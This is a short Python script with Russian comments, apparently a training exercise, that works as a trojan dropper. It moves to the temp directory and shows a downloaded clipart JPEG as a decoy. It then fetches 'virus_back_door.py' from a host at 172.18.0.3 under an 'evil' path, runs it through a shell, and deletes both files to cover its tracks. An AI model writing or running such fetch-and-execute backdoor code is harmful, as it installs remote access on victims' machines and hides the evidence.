import requests, subprocess, os, tempfile

#фун для скачивания файла
def download(url):
    get_resp = requests.get(url)
    # создаем название файла вначале раздиляем и потм по индексу забираем название
    file_name = url.split("/")[-1]
    print(file_name)
    #работа с файлом укз название и чтение, также можно изменять и создвать бинарные файлы для других кодов
    with open(file_name, "wb") as file:
        # если нет файла то мы его создаем
        file.write(get_resp.content)
    
temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)

download("https://img.cliparto.com/pic/xl/180375/3014744-american-style.jpg")
subprocess.call("cat 3014744-american-style.jpg", shell=True)

download("http://172.18.0.3/evil/linux/virus_back_door.py")
subprocess.call("python3 virus_back_door.py", shell=True)

os.remove("3014744-american-style.jpg")
os.remove("virus_back_door.py")


